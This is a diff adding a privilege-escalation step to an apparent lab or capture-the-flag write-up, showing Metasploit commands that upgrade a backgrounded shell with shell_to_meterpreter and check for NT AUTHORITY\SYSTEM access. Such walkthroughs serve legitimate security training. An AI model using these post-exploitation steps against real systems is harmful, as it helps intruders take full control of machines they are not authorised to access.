@@ -91,7 +91,27 @@ This will Execute the Payload using all the Parameters set and give Access to th
 
 **Objective:** Escalate the Privilege of the Shell Obtained to Grant further Access
 
-1. 
+1. Background the Shell (Ctrl+Z) and Find Module that Converts a Shell into a Meterpreter Shell
+```bash
+search shell_to_meterpreter
+```
+Finding the Path to that Module in Metaspolit will allow us to Escalate the Privilege of the Current Shell Obtained 
+
+2. Use and Configure the Converter with the Backgrounded Session
+```bash
+show options
+```
+Check the Required Parameters, in this case being the Session Number
+```bash
+set SESSION <Session-Num>
+```
+Set the Session to the Session Number of the Shell we Backgrounded in Gain Access
+
+3. Run the Exploit
+```bash
+run
+```
+This should open up a Meterpreter Shell with Elevated Privileges. To check this, go to the Windows Shell using Command 'shell' then check Identity of shell with Command 'whoami'. If output 'NT AUTHORITY\SYSTEM' then Privileges have been Elevated
 
 ---
 
